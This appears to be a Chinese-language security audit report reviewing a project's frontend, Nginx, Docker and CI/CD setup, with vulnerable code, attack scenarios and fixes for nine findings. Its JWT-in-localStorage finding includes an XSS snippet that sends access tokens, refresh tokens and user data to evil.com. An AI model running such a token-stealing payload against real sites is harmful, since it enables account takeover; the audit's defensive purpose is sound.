# 基础设施安全审计 - 第六轮审查
## 前端、Docker、Nginx 和 CI/CD 深度审查

**审查日期**: 2025-05-05 23:30
**审查范围**: 前端代码、Docker配置、Nginx、CI/CD流水线
**总漏洞数**: 67 个（新增 9 个）

---

## 🔴 新增严重问题 (2个)

### C-14: JWT 令牌存储在 localStorage - XSS 攻击风险
**严重程度**: CRITICAL
**CVSS**: 9.1 (Critical)
**CWE**: CWE-922 (Insecure Storage of Sensitive Information)
**OWASP**: A02:2021 – Cryptographic Failures

**位置**:
- 文件: `service/frontend/src/services/authService.js`
- 行: 26, 34, 54, 76-81

**漏洞代码**:
```javascript
// Line 26-28: JWT 存储在 localStorage
isAuthenticated() {
  const token = localStorage.getItem(TOKEN_KEY);
  return !!token;
}

// Line 76-81: 设置令牌到 localStorage
setAuthData(token, refreshToken, provider, user) {
  localStorage.setItem(TOKEN_KEY, token);           // ← XSS 可窃取
  if (refreshToken) {
    localStorage.setItem(REFRESH_TOKEN_KEY, refreshToken);  // ← 刷新令牌也可窃取
  }
  localStorage.setItem(PROVIDER_KEY, provider);
  localStorage.setItem(USER_KEY, JSON.stringify(user));
}
```

**问题**:
1. **localStorage 可被 JavaScript 访问**: 任何 XSS 漏洞都可以窃取令牌
2. **无 HttpOnly 保护**: 不像 Cookie，localStorage 没有 HttpOnly 标志
3. **持久化存储**: 令牌永久存储在浏览器中
4. **同源所有脚本可访问**: 包括第三方脚本

**攻击场景**:
```javascript
// 恶意脚本通过 XSS 注入
const stealTokens = () => {
  const accessToken = localStorage.getItem('access_token');
  const refreshToken = localStorage.getItem('refresh_token');
  const userInfo = localStorage.getItem('user_info');

  // 发送到攻击者服务器
  fetch('https://evil.com/steal', {
    method: 'POST',
    body: JSON.stringify({ accessToken, refreshToken, userInfo })
  });
};

// 通过反射型 XSS 注入
// URL: https://example.com/#<script>stealTokens()</script>
```

**影响**:
- 攻击者可以完全接管用户账户
- 刷新令牌也被窃取，可以无限期访问
- 即使原用户退出，攻击者仍然有访问权限

**修复方案**:
```javascript
// 选项 1: 使用 httpOnly Cookie（推荐）
async setAuthData(token, refreshToken, provider, user) {
  // 不再存储到 localStorage
  // 令牌通过 Set-Cookie header 由后端设置

  // 只存储非敏感的 provider 信息
  localStorage.setItem(PROVIDER_KEY, provider);

  // 用户信息可以存储，但不应包含敏感数据
  const safeUser = {
    id: user.id,
    username: user.username,
    email: user.email,
    is_admin: user.is_admin
    // 不存储: roles, permissions, tokens
  };
  localStorage.setItem(USER_KEY, JSON.stringify(safeUser));

  this.notifyAuthChange();
}

// 选项 2: 使用 sessionStorage（较不安全但比 localStorage 好）
setAuthData(token, refreshToken, provider, user) {
  sessionStorage.setItem(TOKEN_KEY, token);  // 浏览器关闭时清除
  sessionStorage.setItem(REFRESH_TOKEN_KEY, refreshToken);
  // ...
}

// 选项 3: 使用内存存储 + refresh token rotation
class AuthService {
  constructor() {
    this.memoryToken = null;
  }

  setAuthData(token, refreshToken, provider, user) {
    this.memoryToken = token;  // 只在内存中
    // refresh token 存储在 httpOnly cookie
  }
}
```

**后端配合修改**:
```python
from fastapi import Response
from fastapi.security import OAuth2PasswordBearer

@router.post("/auth/login")
async def login(response: Response, username: str, password: str):
    # 验证凭据
    user = await authenticate_user(username, password)

    # 创建令牌
    access_token = create_access_token(data={"sub": user.username})
    refresh_token = create_refresh_token(data={"sub": user.username})

    # 设置 httpOnly cookie
    response.set_cookie(
        key="access_token",
        value=access_token,
        httponly=True,      # ← JavaScript 无法访问
        secure=True,        # ← 只通过 HTTPS 传输
        samesite="strict",   # ← CSRF 保护
        max_age=3600        # ← 1 小时
    )

    response.set_cookie(
        key="refresh_token",
        value=refresh_token,
        httponly=True,
        secure=True,
        samesite="strict",
        max_age=2592000     # ← 30 天
    )

    return {"user": user}
```

---

### C-15: Nginx 配置为 HTTP - 中间人攻击风险
**严重程度**: CRITICAL
**CVSS**: 8.8 (High)
**CWE**: CWE-319 (Cleartext Transmission of Sensitive Information)
**OWASP**: A02:2021 – Cryptographic Failures

**位置**:
- 文件: `service/nginx/nginx.conf`
- 行: 59-60

**漏洞代码**:
```nginx
server {
    listen 80;              # ← 只监听 HTTP，无 HTTPS
    server_name localhost;

    # JWT 令牌通过此连接传输
    location /api/v1/ {
        proxy_pass http://$backend_host:$backend_port;
        proxy_set_header Authorization $http_authorization;  # ← 明文传输
    }
}
```

**问题**:
1. **无 TLS/SSL 加密**: 所有通信都是明文
2. **JWT 令牌可被窃听**: Authorization header 可被网络嗅探
3. **密码可被窃听**: 登录请求包含明文密码
4. **无数据完整性保护**: 流量可被中间人篡改
5. **缺少 HSTS**: 无法强制使用 HTTPS

**攻击场景**:
```
用户 → [攻击者 Wi-Fi] → Nginx → 后端

攻击者可以：
1. 窃听所有流量（包括令牌、密码、用户数据）
2. 篡改请求（修改测试结果、注入恶意代码）
3. 中间人攻击（伪造响应、钓鱼）
```

**修复方案**:
```nginx
# 1. 配置 HTTPS 服务器
server {
    listen 443 ssl http2;
    server_name your-domain.com;

    # SSL 证书配置
    ssl_certificate /etc/nginx/ssl/cert.pem;
    ssl_certificate_key /etc/nginx/ssl/key.pem;

    # 现代 SSL 配置
    ssl_protocols TLSv1.2 TLSv1.3;
    ssl_ciphers 'ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384';
    ssl_prefer_server_ciphers on;
    ssl_session_cache shared:SSL:10m;
    ssl_session_timeout 10m;

    # 安全头
    add_header Strict-Transport-Security "max-age=31536000; includeSubDomains; preload" always;
    add_header X-Frame-Options "DENY" always;
    add_header X-Content-Type-Options "nosniff" always;
    add_header X-XSS-Protection "1; mode=block" always;
    add_header Content-Security-Policy "default-src 'self'; script-src 'self' 'unsafe-inline' 'unsafe-eval'; style-src 'self' 'unsafe-inline';" always;

    # 其他配置...
    location /api/v1/ {
        proxy_pass https://$backend_host:$backend_port;  # ← 后端也使用 HTTPS
        # ...
    }
}

# 2. HTTP 重定向到 HTTPS
server {
    listen 80;
    server_name your-domain.com;

    # 重定向所有 HTTP 流量到 HTTPS
    return 301 https://$server_name$request_uri;
}

# 3. Docker 暴露 443 端口
# docker-compose.yml
nginx:
  ports:
    - "80:80"    # HTTP → HTTPS 重定向
    - "443:443"  # HTTPS
  volumes:
    - ./nginx/nginx.conf:/etc/nginx/nginx.conf:ro
    - ./nginx/ssl:/etc/nginx/ssl:ro  # ← SSL 证书
```

---

## 🟠 新增高危问题 (4个)

### H-18: SonarQube 和 OWASP ZAP 暴露在公网
**严重程度**: HIGH
**CVSS**: 7.5 (High)
**CWE**: CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor)

**位置**: `service/docker-compose.yml:242-243, 259-260`

**漏洞代码**:
```yaml
# SonarQube - 代码质量和安全分析工具
sonarqube:
  ports:
    - "9000:9000"    # ← 暴露在公网，任何人可访问

# OWASP ZAP - 动态安全测试工具
owasp-zap:
  ports:
    - "8090:8080"    # ← 暴露在公网，任何人可访问
  environment:
    ZAP_API_KEY: ${ZAP_API_KEY:-change-this-in-production}  # ← 默认密钥可猜测
```

**问题**:
1. **安全工具暴露**: SonarQube 和 ZAP 可以被攻击者利用
2. **无访问控制**: 任何人都可以访问这些工具
3. **默认密钥**: ZAP 使用可猜测的默认 API 密钥
4. **代码泄露**: SonarQube 包含源代码分析结果
5. **攻击信息**: ZAP 包含应用漏洞详情

**修复**:
```yaml
# 选项 1: 移除端口映射（推荐）
sonarqube:
  # 不暴露端口，只在内网访问
  # ports:
  #   - "9000:9000"

# 选项 2: 只在 localhost 暴露
sonarqube:
  ports:
    - "127.0.0.1:9000:9000"  # ← 只在本地访问

# 选项 3: 添加认证
owasp-zap:
  environment:
    ZAP_API_KEY: ${ZAP_API_KEY}  # ← 必须设置强密钥
  # 使用 nginx 反向代理 + 基本认证
```

---

### H-19: Docker 容器以 Root 运行
**严重程度**: HIGH
**CVSS**: 7.3 (High)
**CWE**: CWE-250 (Execution with Unnecessary Privileges)

**位置**: `service/backend/Dockerfile:48-52, 65`

**漏洞代码**:
```dockerfile
# Line 48: 创建非 root 用户
RUN useradd -m -u 1000 appuser && chown -R appuser:appuser /app

# Line 51-52: 切换到非 root 用户
USER appuser
RUN playwright install chromium

# Line 65: 但是以 root 运行应用？
CMD ["uvicorn", "app.main:app", "--host", "0.0.0.0", "--port", "8001"]
```

**问题**:
虽然 Dockerfile 创建了非 root 用户，但需要验证容器实际运行时是否使用该用户。

**修复**:
```dockerfile
# 确保所有步骤都以非 root 运行
FROM python:3.11-slim

# 创建非 root 用户
RUN useradd -m -u 1000 appuser

# 切换到非 root 用户
USER appuser
WORKDIR /home/appuser/app

# 安装依赖（以非 root 用户）
COPY --chown=appuser:appuser requirements.txt .
RUN pip install --user --no-cache-dir -r requirements.txt

# 安装 Playwright
RUN playwright install --with-deps chromium

# 复制应用代码
COPY --chown=appuser:appuser . .

# 暴露端口
EXPOSE 8001

# 以非 root 用户运行
CMD ["python", "-m", "uvicorn", "app.main:app", "--host", "0.0.0.0", "--port", "8001"]
```

---

### H-20: CI/CD 流水线缺少安全检查
**严重程度**: HIGH
**CVSS**: 7.2 (High)
**CWE**: CWE-78 (OS Command Injection)

**位置**: `.github/workflows/build-and-publish.yml`

**漏洞代码**:
```yaml
name: Build and Publish Docker Image

on:
  push:
    branches:
      - main    # ← 任何推送到 main 都会触发构建

jobs:
  build-and-push:
    runs-on: ubuntu-latest
    permissions:
      contents: read
      packages: write   # ← 可以写入包

    steps:
    - name: Build and push Docker image
      uses: docker/build-push-action@v6
      with:
        context: .  # ← 没有验证 Dockerfile 安全性
        push: true  # ← 直接推送，没有扫描
```

**问题**:
1. **无代码扫描**: 没有运行安全扫描工具
2. **无依赖检查**: 没有检查依赖漏洞
3. **无 Docker 镜像扫描**: 没有扫描镜像漏洞
4. **无 PR 审查强制**: 没有 require status check
5. **直接推送**: 恶意代码可以直接进入生产

**修复**:
```yaml
name: Build and Publish Docker Image

on:
  push:
    branches:
      - main
  pull_request:
    branches:
      - main

jobs:
  security-scan:
    runs-on: ubuntu-latest
    steps:
    - uses: actions/checkout@v4

    # 运行 Bandit Python 安全扫描
    - name: Run Bandit
      run: |
        pip install bandit
        bandit -r service/backend/app -f json -o bandit-report.json

    # 运行 npm audit
    - name: Run npm audit
      run: npm audit --production --audit-level=high
      working-directory: ./service/frontend/src

    # 上传报告
    - uses: actions/upload-artifact@v4
      with:
        name: security-reports
        path: bandit-report.json

  build-and-push:
    needs: security-scan  # ← 等待安全扫描通过
    runs-on: ubuntu-latest
    if: github.ref == 'refs/heads/main'  # ← 只在 main 分支推送

    steps:
    - uses: actions/checkout@v4

    # 构建 Docker 镜像
    - name: Build image
      uses: docker/build-push-action@v6
      with:
        context: .
        load: true  # ← 加载到本地，不推送
        tags: ${{ env.REGISTRY }}/${{ env.IMAGE_NAME }}:test

    # 扫描 Docker 镜像
    - name: Run Trivy vulnerability scanner
      uses: aquasecurity/trivy-action@master
      with:
        image-ref: ${{ env.REGISTRY }}/${{ env.IMAGE_NAME }}:test
        format: 'sarif'
        output: 'trivy-results.sarif'
        severity: 'CRITICAL,HIGH'

    # 推送镜像（只有扫描通过）
    - name: Push image
      if: steps.trivy.exit_code == 0
      uses: docker/build-push-action@v6
      with:
        context: .
        push: true
        tags: ${{ env.REGISTRY }}/${{ env.IMAGE_NAME }}:latest
```

**添加 PR 保护**:
```bash
# 使用 GitHub CLI 设置分支保护
gh api \
  --method PUT \
  repos/:owner/:repo/branches/main/protection \
  -f required_status_checks='{"strict":true,"contexts":["security-scan"]}' \
  -f enforce_admins=true \
  -f required_pull_request_reviews='{"required_approving_review_count":1}'
```

---

### H-21: Nginx 代理超时设置过长 - DoS 风险
**严重程度**: HIGH
**CVSS**: 7.1 (High)
**CWE**: CWE-770 (Allocation of Resources Without Limits)

**位置**: `service/nginx/nginx.conf:197`

**漏洞代码**:
```nginx
# Frontend (Vite dev server) - default route
location / {
    proxy_pass http://dashboard_frontend;
    proxy_read_timeout 86400;  # ← 24 小时！
}
```

**问题**:
1. **极长的超时**: 86400 秒 = 24 小时
2. **资源耗尽**: 慢连接可以占用连接数
3. **DoS 攻击**: 攻击者可以打开许多慢速连接
4. **无速率限制**: 没有限制连接数

**修复**:
```nginx
# 设置合理的超时
location / {
    proxy_pass http://dashboard_frontend;
    proxy_http_version 1.1;
    proxy_set_header Upgrade $http_upgrade;
    proxy_set_header Connection 'upgrade';

    # 合理的超时设置
    proxy_connect_timeout 60s;   # ← 连接超时
    proxy_send_timeout 60s;      # ← 发送超时
    proxy_read_timeout 300s;     # ← 读取超时（5 分钟）

    # WebSocket 需要更长的超时
    # 但应该使用单独的 location
}

# WebSocket 单独配置
location /ws {
    proxy_pass http://dashboard_frontend;
    proxy_http_version 1.1;
    proxy_set_header Upgrade $http_upgrade;
    proxy_set_header Connection 'upgrade';
    proxy_read_timeout 3600s;  # ← 1 小时（仅用于 WebSocket）
}
```

---

## 🟡 新增中危问题 (3个)

### M-26: 前端密码最小长度只有 8 字符
**严重程度**: MEDIUM
**CVSS**: 5.5 (Medium)
**CWE**: CWE-521 (Weak Password Requirements)

**位置**: `service/frontend/src/components/UserForm.jsx:123`

**漏洞代码**:
```jsx
<input
  type="password"
  id="password"
  name="password"
  value={formData.password}
  onChange={handleChange}
  required
  minLength={8}   # ← 最小长度只有 8
  maxLength={100}
  className="form-input"
  placeholder="请输入密码（至少8个字符）"
/>
```

**问题**: 8 字符密码容易被暴力破解。

**修复**:
```jsx
<input
  type="password"
  minLength={12}  # ← 增加到 12 字符
  // 添加密码强度验证
  pattern="^(?=.*[a-z])(?=.*[A-Z])(?=.*\d)(?=.*[@$!%*?&])[A-Za-z\d@$!%*?&]{12,}$"
  // 添加实时密码强度指示器
/>
```

---

### M-27: 缺少 Nginx 安全头
**严重程度**: MEDIUM
**CVSS**: 5.3 (Medium)
**CWE**: CWE-693 (Protection Mechanism Failure)

**位置**: `service/nginx/nginx.conf`

**修复**:
```nginx
server {
    listen 443 ssl http2;

    # 添加安全头
    add_header Strict-Transport-Security "max-age=31536000; includeSubDomains; preload" always;
    add_header X-Frame-Options "DENY" always;
    add_header X-Content-Type-Options "nosniff" always;
    add_header X-XSS-Protection "1; mode=block" always;
    add_header Referrer-Policy "strict-origin-when-cross-origin" always;
    add_header Permissions-Policy "geolocation=(), microphone=(), camera=()" always;
    add_header Content-Security-Policy "default-src 'self'; script-src 'self' 'unsafe-inline' 'unsafe-eval'; style-src 'self' 'unsafe-inline'; img-src 'self' data: https:; font-src 'self' data:;" always;

    # ...
}
```

---

### M-28: 前端使用 setTimeout/setInterval 但无清理
**严重程度**: MEDIUM
**CVSS**: 4.6 (Medium)
**CWE**: CWE-772 (Missing Release of Resource after Effective Lifetime)

**位置**: `service/frontend/src/components/DashboardView.jsx:96`

**漏洞代码**:
```jsx
useEffect(() => {
  const interval = setInterval(() => {
    // 定期刷新
  }, 5000);

  // 缺少清理函数
  // return () => clearInterval(interval);
}, []);
```

**修复**:
```jsx
useEffect(() => {
  const interval = setInterval(() => {
    // 定期刷新
  }, 5000);

  // 添加清理函数
  return () => clearInterval(interval);
}, []);
```

---

## 📊 第六轮审查总结

**新增安全问题**:
- 🔴 严重: 2
- 🟠 高危: 4
- 🟡 中危: 3

**总计更新**: 58 → **67 个安全问题**

---

## 🎯 修复优先级

### 立即修复（今天）:
1. ✅ 将 JWT 从 localStorage 迁移到 httpOnly Cookie
2. ✅ 配置 Nginx HTTPS/TLS
3. ✅ 移除 SonarQube 和 ZAP 的公网端口映射
4. ✅ 添加 CI/CD 安全扫描

### 本周修复:
1. 验证 Docker 容器以非 root 用户运行
2. 减少 Nginx 超时时间
3. 增加密码最小长度到 12 字符
4. 添加 Nginx 安全头
5. 修复前端定时器清理

---

**审查完成时间**: 2025-05-05 23:45
**审查方法**: 手动代码审查 + 配置分析
**新增漏洞**: 9 个
**安全评级**: 1.5/10 (极差) ⭐⭐
